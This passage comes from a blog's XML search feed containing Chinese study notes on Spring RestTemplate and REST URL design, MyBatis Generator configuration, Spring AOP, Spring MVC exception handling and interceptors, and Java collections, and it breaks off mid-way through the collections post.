      <link href="/2021/03/13/2021-03-13-RestTemplate-%E8%AE%BF%E9%97%AEWeb%E8%B5%84%E6%BA%90/"/>
      <url>/2021/03/13/2021-03-13-RestTemplate-%E8%AE%BF%E9%97%AEWeb%E8%B5%84%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-Boot-中的RestTemplate">Spring Boot 中的RestTemplate</h2><ul><li>Spring Boot 中没有自动配置RestTemplate</li><li>Spring Boot 提供了RestTemplateBuilder<ul><li>RestTemplate.build()</li></ul></li></ul><h3 id="构造URL">构造URL</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">URI</span> uri <span class="token operator">=</span> <span class="token class-name">Uri</span> <span class="token class-name">ComponentsBuilder</span><span class="token punctuation">.</span><span class="token function">fromUriString</span><span class="token punctuation">(</span><span class="token string">"http://example.com/hotels/&#123;hotel&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">queryParam</span><span class="token punctuation">(</span><span class="token string">"q"</span><span class="token punctuation">,</span><span class="token string">"&#123;q&#125;"</span><span class="token punctuation">)</span>   <span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">buildAndExpand</span><span class="token punctuation">(</span><span class="token string">"Westin"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUri</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//更为简洁</span><span class="token class-name">URI</span> uri <span class="token operator">=</span> <span class="token class-name">UriComponentsBuilder</span><span class="token punctuation">.</span><span class="token function">fromUriString</span><span class="token punctuation">(</span><span class="token string">"http://example.com/hotels/&#123;hotel&#125;?q=&#123;q&#125;"</span>        <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token string">"Westin"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token class-name">UriComponents</span> uriComponents <span class="token operator">=</span> <span class="token class-name">MvcUriComponentsBuilder</span><span class="token punctuation">.</span><span class="token function">fromMethodCal1</span><span class="token punctuation">(</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token class-name">BookingController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBooking</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">buildAndExpand</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">URI</span> uri <span class="token operator">=</span> uriComponents<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUri</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Rest">Rest</h2><blockquote><p>&quot;REST提供了一组架构约束，当作为一个整体来应用时，强调组件交互的<br>可伸缩性、接口的通用性、组件的独立部署、以及用来减少交互延迟、增<br>强安全性、封装遗留系统的中间组件。”</p><p>Roy Thomas Fielding</p></blockquote><h3 id="Richardson-成熟度模型">Richardson 成熟度模型</h3><p><a href="https://imgtu.com/i/6wEgsJ"><img src="https://s3.ax1x.com/2021/03/13/6wEgsJ.png" alt="6wEgsJ.png"></a></p><h3 id="如何实现-Restful-Web-Service">如何实现 Restful Web Service</h3><ul><li><p>识别资源</p></li><li><p>选择合适的资源粒度</p></li><li><p>设计URL</p></li><li><p>选择合适的 HTTP 方法和返回码</p></li><li><p>设计资源的表述</p><h4 id="识别资源">识别资源</h4><ul><li>找到领域名词<ul><li>能用CRUD操作的名词</li></ul></li><li>将资源组织为集合（即集合资源）</li><li>将资源合并为复合资源</li><li>计算或处理函数</li></ul><h4 id="资源的粒度">资源的粒度</h4><p><strong>站在服务端的角度，要考虑</strong></p><ul><li>网络效率</li><li>表述的多少</li><li>客户端的易用程度</li></ul><p><strong>站在客户端的角度，要考虑</strong></p><ul><li>可缓存性</li><li>修改频率</li><li>可变性</li></ul><h4 id="构建更好的URL">构建更好的URL</h4><ul><li>使用域及子域对资源进行合理的分组或划分</li><li>在URI的路径部分使用斜杠分隔符（/)来表示资源之间的层次关系</li><li>在URI的路径部分使用逗号（,)和分号（;)来表示非层次元素</li><li>使用连字符（-)和下划线（_)来改善长路径中名称的可读性</li><li>在URI的查询部分使用“与”符号（&amp;)来分隔参数</li><li>在URI中避免出现文件扩展名（例如.php,.aspx和.jsp)</li></ul><h4 id="认识HTTP方法">认识HTTP方法</h4><p><a href="https://imgtu.com/i/6wNofU"><img src="https://s3.ax1x.com/2021/03/13/6wNofU.png" alt="6wNofU.png"></a></p><h4 id="认识HTTP状态码">认识HTTP状态码</h4><p><a href="https://imgtu.com/i/6waebR"><img src="https://s3.ax1x.com/2021/03/13/6waebR.png" alt="6waebR.png"></a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RestTemplate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>让MyBatis变得更好用</title>
      <link href="/2021/03/10/2021-03-10-%E8%AE%A9MyBatis%E5%8F%98%E5%BE%97%E6%9B%B4%E5%A5%BD%E7%94%A8/"/>
      <url>/2021/03/10/2021-03-10-%E8%AE%A9MyBatis%E5%8F%98%E5%BE%97%E6%9B%B4%E5%A5%BD%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="运行MyBatis-Generator">运行MyBatis Generator</h2><h3 id="命令行">命令行</h3><ul><li>java -jar mybatis-generator-core-x.x.x.jar -configfile generatorConfig.xml</li></ul><h3 id="Maven-Plugin-mybatis-generator-maven-plugin">Maven Plugin (mybatis-generator-maven-plugin)</h3><ul><li>mvn mybatis-generator:generate</li><li>${basedir}/src/main/resources/generatorConfig.xml</li></ul><h2 id="配置MyBatis-Generator">配置MyBatis Generator</h2><p><strong>generatorConfiguration.xml</strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>generatorConfiguration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>H2Tables<span class="token punctuation">"</span></span> <span class="token attr-name">targetRuntime</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MyBatis3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        //插件有顺序        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.mybatis.generator.plugins.FluentBuilderMethodsPlugin<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.mybatis.generator.plugins.ToStringPlugin<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.mybatis.generator.plugins.SerializablePlugin<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.mybatis.generator.plugins.RowBoundsPlugin<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jdbcConnection</span> <span class="token attr-name">driverClass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.h2.Driver<span class="token punctuation">"</span></span>                        <span class="token attr-name">connectionURL</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:h2:mem:testdb<span class="token punctuation">"</span></span>                        <span class="token attr-name">userId</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sa<span class="token punctuation">"</span></span>                        <span class="token attr-name">password</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jdbcConnection</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>javaModelGenerator</span> <span class="token attr-name">targetPackage</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>geektime.spring.data.mybatis.model<span class="token punctuation">"</span></span>                            <span class="token attr-name">targetProject</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./src/main/java<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>enableSubPackages<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>trimStrings<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>javaModelGenerator</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sqlMapGenerator</span> <span class="token attr-name">targetPackage</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>geektime.spring.data.mybatis.mapper<span class="token punctuation">"</span></span>                         <span class="token attr-name">targetProject</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./src/main/resources/mapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>enableSubPackages<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sqlMapGenerator</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>javaClientGenerator</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MIXEDMAPPER<span class="token punctuation">"</span></span>                             <span class="token attr-name">targetPackage</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>geektime.spring.data.mybatis.mapper<span class="token punctuation">"</span></span>                             <span class="token attr-name">targetProject</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./src/main/java<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>enableSubPackages<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>javaClientGenerator</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">tableName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_coffee<span class="token punctuation">"</span></span> <span class="token attr-name">domainObjectName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Coffee<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>generatedKey</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">sqlStatement</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>CALL IDENTITY()<span class="token punctuation">"</span></span> <span class="token attr-name">identity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>columnOverride</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>price<span class="token punctuation">"</span></span> <span class="token attr-name">javaType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.joda.money.Money<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>BIGINT<span class="token punctuation">"</span></span>                            <span class="token attr-name">typeHandler</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>geektime.spring.data.mybatis.handler.MoneyTypeHandler<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>generatorConfiguration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>context</strong></p><ul><li>jdbcConnection</li><li>javaModelGenerator</li><li>sqlMapGenerator</li><li>javaClientGenerator(ANNOTATEDMAPPER / XMLMAPPER / MIXEDMAPPER)</li><li>table</li></ul><h2 id="MyBatis-Plus">MyBatis-Plus</h2><blockquote><p>个人理解就是MyBatis+JPA</p></blockquote><p><a href="https://baomidou.com/guide/generator.html">https://baomidou.com/guide/generator.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring AOP</title>
      <link href="/2021/03/09/2021-03-09-Spring-AOP/"/>
      <url>/2021/03/09/2021-03-09-Spring-AOP/</url>
      
        <content type="html"><![CDATA[<h2 id="核心概念">核心概念</h2><table><thead><tr><th>概念</th><th>含义</th></tr></thead><tbody><tr><td>Aspect</td><td>切面</td></tr><tr><td>Join Point</td><td>连接点，Spring AOP总是代表一次方法执行</td></tr><tr><td>Advice</td><td>通知，在连接点执行的动作</td></tr><tr><td>Pointcut</td><td>切入点，说明如何匹配连接点</td></tr><tr><td>Introduction</td><td>引入，为现有类型声明额外的方法和属性</td></tr><tr><td>Target object</td><td>目标对象</td></tr><tr><td>AOP proxy</td><td>AOP代理对象，可以是JDK动态代理，也可以是CGLIB代理</td></tr><tr><td>Weaving</td><td>织入，连接切面与目标对象或类型创建代理的过程</td></tr></tbody></table><h2 id="常用注解">常用注解</h2><ul><li><p>@EnableAspectJpaAutoProxy</p></li><li><p>@Aspect</p><p>切面是<code>Pointcut</code>和<code>Advice</code>的集合，一般单独作为一个类。<code>Pointcut</code>和<code>Advice</code>。共同定义了关于切面的全部内容。<code>@Aspect</code> 修饰的类要么是用 <code>@Component</code>注解修饰，要么是在 XML中配置过的。</p></li><li><p>@Pointcut</p><p>这是应用程序中使用Spring AOP框架采取操作的实际位置。</p></li><li><p>@Before</p></li><li><p>@Advice</p><p>这是应用程序中使用Spring AOP框架采取操作的实际位置。</p></li><li><p>@After / @AfterReturning / @AfterThrowing</p></li><li><p>@Around</p></li><li><p>@Order</p></li></ul><h2 id="如何打印SQL">如何打印SQL</h2><h3 id="HikariCP"><strong>HikariCP</strong></h3><ul><li>P6Spy, <a href="http://github.com/p6spy/p6spy">http://github.com/p6spy/p6spy</a></li></ul><p><strong>Alibaba Druid</strong></p><ul><li>内置SQL输出</li><li><a href="http://github.com/alibaba/druid/wiki/Druid%E4%B8%AD%E4%BD%BF%E7%94%A8log4j2%E8%BE%93%E5%87%BA">http://github.com/alibaba/druid/wiki/Druid中使用log4j2输出</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MVC 的异常处理机制</title>
      <link href="/2021/03/09/2021-03-09-Spring-MVC-%E7%9A%84%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/"/>
      <url>/2021/03/09/2021-03-09-Spring-MVC-%E7%9A%84%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-MVC的异常解析">Spring MVC的异常解析</h2><p><strong>核心接口</strong></p><ul><li>HandlerExceptionResolver</li></ul><p><strong>实现类</strong></p><ul><li>SimpleMappingExceptionResolver</li><li>DefaultHandlerExceptionResolver</li><li>ResponseStatusExceptionResolver</li><li>ExceptionHandlerExceptionResolver</li></ul><p><strong>异常处理方法</strong></p><ul><li>@ExceptionHandler</li></ul><p><strong>添加位置</strong></p><ul><li>@Controller / @RestController</li><li>@ControllerAdvice / @RestControllerAdvice</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MVC的切入点</title>
      <link href="/2021/03/09/2021-03-09-Spring-MVC%E7%9A%84%E5%88%87%E5%85%A5%E7%82%B9/"/>
      <url>/2021/03/09/2021-03-09-Spring-MVC%E7%9A%84%E5%88%87%E5%85%A5%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-MVC-的拦截器">Spring MVC 的拦截器</h2><p><strong>核心接口</strong></p><ul><li>HandlerInterceptor<ul><li>boolean preHandle()</li><li>void postHandle()</li><li>void afterHandle()</li></ul></li></ul><p><strong>针对@ReponseBody和ResponseEntity的情况</strong></p><ul><li>ResponseBodyAdvice</li></ul><p><strong>针对异步请求的接口</strong></p><ul><li>AsyncHandlerInterceptor<ul><li>void afterConcurrentHandlingStarted()</li></ul></li></ul><h2 id="拦截器的配置方式">拦截器的配置方式</h2><p><strong>常规方法</strong></p><ul><li>WebMvcConfigurer.addInterceptors()</li></ul><p><strong>Spring Boot 中的配置</strong></p><ul><li>创建一个带@Configuration的WebMvcConfiguration配置类</li><li>不能带@EnableWebMvc</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java中的各种集合</title>
      <link href="/2021/03/08/2021-03-08-Java%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E9%9B%86%E5%90%88/"/>
      <url>/2021/03/08/2021-03-08-Java%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<p><a href="https://imgtu.com/i/6QPiex"><img src="https://s3.ax1x.com/2021/03/08/6QPiex.png" alt="6QPiex.png"></a></p><h2 id="Collection集合概述和基本使用">Collection集合概述和基本使用</h2><h3 id="Collection集合概述">Collection集合概述</h3><ul><li>是单例集合的顶层接口，表示一组对象，这些对象也称Collection元素</li><li>JDK不提供此接口的任何直接实现，它提供更加具体的子接口如（Set和List）</li></ul><h3 id="常用方法">常用方法</h3><ul><li>boolean add(E e)</li><li>boolean remove(Object 0)</li><li>void clear()</li><li>boolean contains(Object 0)</li><li>boolean isEmpty()</li><li>int size()</li></ul><h3 id="遍历方式">遍历方式</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IteratorDemo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Collection</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arraylist</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                c<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Iterator&lt;E> iterator():返回此集合中的迭代器，通过集合的iterator()方法得到   </span>        <span class="token class-name">Iterator</span> it <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> s <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="List集合概述与特点">List集合概述与特点</h2><h3 id="特点">特点</h3><ul><li>有索引</li><li>可以存储重复元素</li><li>元素存取有序</li></ul><h3 id="特有方法">特有方法</h3><ul><li>void add(int index,E element)</li><li>E remove(int index)</li><li>E set(int index,E element)</li><li>E get(int index)</li></ul><h3 id="遍历方式-2">遍历方式</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ListDemo</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//迭代器方式，ListIteraroe,List特有的迭代器：允许程序员沿任一方向遍历的列表迭代器</span><span class="token class-name">ListIterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> it <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">listIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span> s <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//for循环模式</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> s <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token comment">//增强for循环</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> list<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="List集合的实现类">List集合的实现类</h3><ul><li><p>ArrayList集合</p><p>底层是数组结构的实现，==查询快、增删慢==</p></li><li><p>LinkedList集合</p><p>底层是链表的实现，==查询慢、增删快==</p><ul><li><p>特有方法</p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>public void addFirst(E e)</td><td>在列表开头插入元素</td></tr><tr><td>public void addLast(E e)</td><td>将指定元素追加到列表末尾</td></tr><tr><td>public E getFirst()</td><td>返回此列表第一个元素</td></tr><tr><td>public E getLast()</td><td>返回此列表最后一个元素</td></tr><tr><td>public E removeFirst()</td><td>从此列表中删除并返回第一个元素</td></tr><tr><td>public E removeLast()</td><td>从此列表中删除并返回最后一个元素</td></tr></tbody></table></li></ul></li></ul><h2 id="数据结构">数据结构</h2><h3 id="栈和队列">栈和队列</h3><ul><li>栈结构 先进后出</li><li>队列结构 先进后出</li></ul><h3 id="数组与链表">数组与链表</h3><ul><li>数组结构 查询快、增删慢</li><li>队列结构 查询慢、增删快</li></ul><h2 id="Set集合">Set集合</h2><ul><li>元素存取无序</li><li>没有索引、只能通过迭代器或者for循环遍历</li></ul><h3 id="哈希值">哈希值</h3><ul><li><p>哈希值简介</p><p>是JDK根据对象的地址或者字符串</p></li><li><p>如何获取哈希值</p><p>Object类中的public int hashCode():返回对象的哈希值</p></li><li><p>哈希值的特点</p><ul><li><p>同一个对象调用hashCode()方法返回的哈希值是相同的</p></li><li><p>默认情况下，不同对象的哈希值是不同的，而重写hashCode方法，可以使不同对象的哈希值相同</p></li></ul></li></ul><h3 id="HashSet集合">HashSet集合</h3><ul><li>底层数据是哈希表</li><li>对集合的迭代顺序不做保证</li><li>没有带索引的方法，不能使用普通的for遍历</li><li>无重复元素</li></ul><p><strong>如何保证其唯一性</strong></p><pre class="line-numbers language-flow" data-language="flow"><code class="language-flow">st<span class="token operator">=></span>start<span class="token operator">:</span> 调用对象的HashCode方法获取对象的哈希值opt<span class="token operator">=></span>operation<span class="token operator">:</span> 根据对象的哈希值计算对象的储存位置op<span class="token operator">=></span>operation<span class="token operator">:</span> 将元素存储在这一位置cond<span class="token operator">=></span>condition<span class="token operator">:</span> 该位置是否有元素存在e<span class="token operator">=></span>condition<span class="token operator">:</span> 遍历所有元素，和新存入的元素比较哈希值是否相同demo<span class="token operator">=></span>condition<span class="token operator">:</span> <span 